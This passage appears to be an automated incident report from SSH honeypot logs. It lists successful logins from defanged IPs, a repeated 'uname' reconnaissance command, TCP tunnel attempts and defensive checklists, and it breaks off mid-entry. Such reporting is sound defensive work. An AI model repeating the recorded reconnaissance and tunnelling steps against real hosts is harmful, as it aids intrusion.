- [ ] Submit `218.15.224[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.15.224[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89dc7d8afd45

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-04 15:19 |
| **Last Seen** | 2026-08-04 15:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:19:12` | `cowrie.session.connect` |
| `2026-08-04 15:19:12` | `cowrie.client.version` |
| `2026-08-04 15:19:12` | `cowrie.client.kex` |
| `2026-08-04 15:19:14` | `cowrie.login.success` |
| `2026-08-04 15:19:15` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66ecbedd15c1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:20 |
| **Last Seen** | 2026-08-04 15:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:20:30` | `cowrie.session.connect` |
| `2026-08-04 15:20:30` | `cowrie.client.version` |
| `2026-08-04 15:20:30` | `cowrie.client.kex` |
| `2026-08-04 15:20:31` | `cowrie.login.success` |
| `2026-08-04 15:20:31` | `cowrie.session.params` |
| `2026-08-04 15:20:31` | `cowrie.command.input` |
| `2026-08-04 15:20:31` | `cowrie.log.closed` |
| `2026-08-04 15:20:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81bba1a0d146

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:22 |
| **Last Seen** | 2026-08-04 15:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:22:18` | `cowrie.session.connect` |
| `2026-08-04 15:22:18` | `cowrie.client.version` |
| `2026-08-04 15:22:18` | `cowrie.client.kex` |
| `2026-08-04 15:22:19` | `cowrie.login.success` |
| `2026-08-04 15:22:20` | `cowrie.session.params` |
| `2026-08-04 15:22:20` | `cowrie.command.input` |
| `2026-08-04 15:22:20` | `cowrie.log.closed` |
| `2026-08-04 15:22:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b5892bea10

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:24 |
| **Last Seen** | 2026-08-04 15:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:24:03` | `cowrie.session.connect` |
| `2026-08-04 15:24:03` | `cowrie.client.version` |
| `2026-08-04 15:24:03` | `cowrie.client.kex` |
| `2026-08-04 15:24:03` | `cowrie.login.success` |
| `2026-08-04 15:24:04` | `cowrie.session.params` |
| `2026-08-04 15:24:04` | `cowrie.command.input` |
| `2026-08-04 15:24:04` | `cowrie.log.closed` |
| `2026-08-04 15:24:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df7c83bbd835

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:25 |
| **Last Seen** | 2026-08-04 15:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:25:47` | `cowrie.session.connect` |
| `2026-08-04 15:25:47` | `cowrie.client.version` |
| `2026-08-04 15:25:47` | `cowrie.client.kex` |
| `2026-08-04 15:25:47` | `cowrie.login.success` |
| `2026-08-04 15:25:48` | `cowrie.session.params` |
| `2026-08-04 15:25:48` | `cowrie.command.input` |
| `2026-08-04 15:25:48` | `cowrie.log.closed` |
| `2026-08-04 15:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4015157caf94

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:27 |
| **Last Seen** | 2026-08-04 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:27:34` | `cowrie.session.connect` |
| `2026-08-04 15:27:34` | `cowrie.client.version` |
| `2026-08-04 15:27:34` | `cowrie.client.kex` |
| `2026-08-04 15:27:35` | `cowrie.login.success` |
| `2026-08-04 15:27:35` | `cowrie.session.params` |
| `2026-08-04 15:27:35` | `cowrie.command.input` |
| `2026-08-04 15:27:36` | `cowrie.log.closed` |
| `2026-08-04 15:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ed1a0710e6c

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
| **First Seen** | 2026-08-04 15:28 |
| **Last Seen** | 2026-08-04 15:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:28:34` | `cowrie.session.connect` |
| `2026-08-04 15:28:34` | `cowrie.client.version` |
| `2026-08-04 15:28:34` | `cowrie.client.kex` |
| `2026-08-04 15:28:35` | `cowrie.login.success` |
| `2026-08-04 15:28:35` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:28:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.135.117[.]245` to AbuseIPDB if not already reported
- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30feb863b7e2

| Field | Detail |
|---|---|
| **Source IP** | `58.226.255[.]240` |
| **First Seen** | 2026-08-04 15:28 |
| **Last Seen** | 2026-08-04 15:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:28:42` | `cowrie.session.connect` |
| `2026-08-04 15:28:43` | `cowrie.client.version` |
| `2026-08-04 15:28:43` | `cowrie.client.kex` |
| `2026-08-04 15:28:45` | `cowrie.login.success` |
| `2026-08-04 15:28:45` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.226.255[.]240` to AbuseIPDB if not already reported
- [ ] Block `58.226.255[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba46a3f9579f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:29 |
| **Last Seen** | 2026-08-04 15:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:29:23` | `cowrie.session.connect` |
| `2026-08-04 15:29:23` | `cowrie.client.version` |
| `2026-08-04 15:29:23` | `cowrie.client.kex` |
| `2026-08-04 15:29:24` | `cowrie.login.success` |
| `2026-08-04 15:29:24` | `cowrie.session.params` |
| `2026-08-04 15:29:24` | `cowrie.command.input` |
| `2026-08-04 15:29:24` | `cowrie.log.closed` |
| `2026-08-04 15:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-411d8aed2955

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:31 |
| **Last Seen** | 2026-08-04 15:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:31:07` | `cowrie.session.connect` |
| `2026-08-04 15:31:07` | `cowrie.client.version` |
| `2026-08-04 15:31:07` | `cowrie.client.kex` |
| `2026-08-04 15:31:08` | `cowrie.login.success` |
| `2026-08-04 15:31:09` | `cowrie.session.params` |
| `2026-08-04 15:31:09` | `cowrie.command.input` |
| `2026-08-04 15:31:09` | `cowrie.log.closed` |
| `2026-08-04 15:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-221f2fc29383

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:32 |
| **Last Seen** | 2026-08-04 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:32:51` | `cowrie.session.connect` |
| `2026-08-04 15:32:51` | `cowrie.client.version` |
| `2026-08-04 15:32:51` | `cowrie.client.kex` |
| `2026-08-04 15:32:52` | `cowrie.login.success` |
| `2026-08-04 15:32:52` | `cowrie.session.params` |
| `2026-08-04 15:32:52` | `cowrie.command.input` |
| `2026-08-04 15:32:53` | `cowrie.log.closed` |
| `2026-08-04 15:32:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f6b32a46829

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:34 |
| **Last Seen** | 2026-08-04 15:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:34:40` | `cowrie.session.connect` |
| `2026-08-04 15:34:40` | `cowrie.client.version` |
| `2026-08-04 15:34:40` | `cowrie.client.kex` |
| `2026-08-04 15:34:41` | `cowrie.login.success` |
| `2026-08-04 15:34:42` | `cowrie.session.params` |
| `2026-08-04 15:34:42` | `cowrie.command.input` |
| `2026-08-04 15:34:42` | `cowrie.log.closed` |
| `2026-08-04 15:34:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6bc425c4c7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:36 |
| **Last Seen** | 2026-08-04 15:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:36:26` | `cowrie.session.connect` |
| `2026-08-04 15:36:26` | `cowrie.client.version` |
| `2026-08-04 15:36:26` | `cowrie.client.kex` |
| `2026-08-04 15:36:26` | `cowrie.login.success` |
| `2026-08-04 15:36:27` | `cowrie.session.params` |
| `2026-08-04 15:36:27` | `cowrie.command.input` |
| `2026-08-04 15:36:27` | `cowrie.log.closed` |
| `2026-08-04 15:36:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd566c834ecf

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 15:37 |
| **Last Seen** | 2026-08-04 15:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:37:03` | `cowrie.session.connect` |
| `2026-08-04 15:37:03` | `cowrie.client.version` |
| `2026-08-04 15:37:03` | `cowrie.client.kex` |
| `2026-08-04 15:37:03` | `cowrie.login.success` |
| `2026-08-04 15:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe8624cfab02

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 15:37 |
| **Last Seen** | 2026-08-04 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:37:03` | `cowrie.session.connect` |
| `2026-08-04 15:37:03` | `cowrie.client.version` |
| `2026-08-04 15:37:03` | `cowrie.client.kex` |
| `2026-08-04 15:37:04` | `cowrie.login.success` |
| `2026-08-04 15:37:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b72af793ca0

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 15:37 |
| **Last Seen** | 2026-08-04 15:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:37:09` | `cowrie.session.connect` |
| `2026-08-04 15:37:09` | `cowrie.client.version` |
| `2026-08-04 15:37:10` | `cowrie.client.kex` |
| `2026-08-04 15:37:10` | `cowrie.login.success` |
| `2026-08-04 15:37:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac74759f692

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-04 15:37 |
| **Last Seen** | 2026-08-04 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:37:10` | `cowrie.session.connect` |
| `2026-08-04 15:37:10` | `cowrie.client.version` |
| `2026-08-04 15:37:11` | `cowrie.client.kex` |
| `2026-08-04 15:37:11` | `cowrie.login.success` |
| `2026-08-04 15:37:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5497d5b3ebb0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:38 |
| **Last Seen** | 2026-08-04 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:38:10` | `cowrie.session.connect` |
| `2026-08-04 15:38:10` | `cowrie.client.version` |
| `2026-08-04 15:38:10` | `cowrie.client.kex` |
| `2026-08-04 15:38:11` | `cowrie.login.success` |
| `2026-08-04 15:38:11` | `cowrie.session.params` |
| `2026-08-04 15:38:11` | `cowrie.command.input` |
| `2026-08-04 15:38:11` | `cowrie.log.closed` |
| `2026-08-04 15:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6a0409830b5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:39 |
| **Last Seen** | 2026-08-04 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:39:58` | `cowrie.session.connect` |
| `2026-08-04 15:39:58` | `cowrie.client.version` |
| `2026-08-04 15:39:58` | `cowrie.client.kex` |
| `2026-08-04 15:39:59` | `cowrie.login.success` |
| `2026-08-04 15:40:00` | `cowrie.session.params` |
| `2026-08-04 15:40:00` | `cowrie.command.input` |
| `2026-08-04 15:40:00` | `cowrie.log.closed` |
| `2026-08-04 15:40:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0452dc5902df

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:41 |
| **Last Seen** | 2026-08-04 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:41:48` | `cowrie.session.connect` |
| `2026-08-04 15:41:48` | `cowrie.client.version` |
| `2026-08-04 15:41:48` | `cowrie.client.kex` |
| `2026-08-04 15:41:49` | `cowrie.login.success` |
| `2026-08-04 15:41:50` | `cowrie.session.params` |
| `2026-08-04 15:41:50` | `cowrie.command.input` |
| `2026-08-04 15:41:50` | `cowrie.log.closed` |
| `2026-08-04 15:41:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a93dd000f34

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:43 |
| **Last Seen** | 2026-08-04 15:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:43:34` | `cowrie.session.connect` |
| `2026-08-04 15:43:34` | `cowrie.client.version` |
| `2026-08-04 15:43:34` | `cowrie.client.kex` |
| `2026-08-04 15:43:34` | `cowrie.login.success` |
| `2026-08-04 15:43:35` | `cowrie.session.params` |
| `2026-08-04 15:43:35` | `cowrie.command.input` |
| `2026-08-04 15:43:35` | `cowrie.log.closed` |
| `2026-08-04 15:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9130927e6cca

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]230` |
| **First Seen** | 2026-08-04 15:44 |
| **Last Seen** | 2026-08-04 15:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:44:17` | `cowrie.session.connect` |
| `2026-08-04 15:44:17` | `cowrie.client.version` |
| `2026-08-04 15:44:17` | `cowrie.client.kex` |
| `2026-08-04 15:44:17` | `cowrie.login.success` |
| `2026-08-04 15:44:18` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:44:18` | `cowrie.direct-tcpip.data` |
| `2026-08-04 15:44:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]230` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]230` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb12b9b05be3

| Field | Detail |
|---|---|
| **Source IP** | `130.185.96[.]113` |
| **First Seen** | 2026-08-04 15:45 |
| **Last Seen** | 2026-08-04 15:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:45:12` | `cowrie.session.connect` |
| `2026-08-04 15:45:14` | `cowrie.client.version` |
| `2026-08-04 15:45:14` | `cowrie.client.kex` |
| `2026-08-04 15:45:16` | `cowrie.login.success` |
| `2026-08-04 15:45:17` | `cowrie.direct-tcpip.request` |
| `2026-08-04 15:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.185.96[.]113` to AbuseIPDB if not already reported
- [ ] Block `130.185.96[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6ab89c50ee

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:45 |
| **Last Seen** | 2026-08-04 15:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:45:19` | `cowrie.session.connect` |
| `2026-08-04 15:45:19` | `cowrie.client.version` |
| `2026-08-04 15:45:19` | `cowrie.client.kex` |
| `2026-08-04 15:45:19` | `cowrie.login.success` |
| `2026-08-04 15:45:20` | `cowrie.session.params` |
| `2026-08-04 15:45:20` | `cowrie.command.input` |
| `2026-08-04 15:45:20` | `cowrie.log.closed` |
| `2026-08-04 15:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ee446a3589

| Field | Detail |
|---|---|
| **Source IP** | `47.85.8[.]171` |
| **First Seen** | 2026-08-04 15:46 |
| **Last Seen** | 2026-08-04 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:46:26` | `cowrie.session.connect` |
| `2026-08-04 15:46:26` | `cowrie.client.version` |
| `2026-08-04 15:46:26` | `cowrie.client.kex` |
| `2026-08-04 15:46:26` | `cowrie.login.success` |
| `2026-08-04 15:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.85.8[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.8[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6be43b8ab279

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-04 15:46 |
| **Last Seen** | 2026-08-04 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:46:26` | `cowrie.session.connect` |
| `2026-08-04 15:46:26` | `cowrie.client.version` |
| `2026-08-04 15:46:26` | `cowrie.client.kex` |
| `2026-08-04 15:46:26` | `cowrie.login.success` |
| `2026-08-04 15:46:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-515bee8070aa

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 15:47 |
| **Last Seen** | 2026-08-04 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 15:47:08` | `cowrie.session.connect` |
| `2026-08-04 15:47:08` | `cowrie.client.version` |
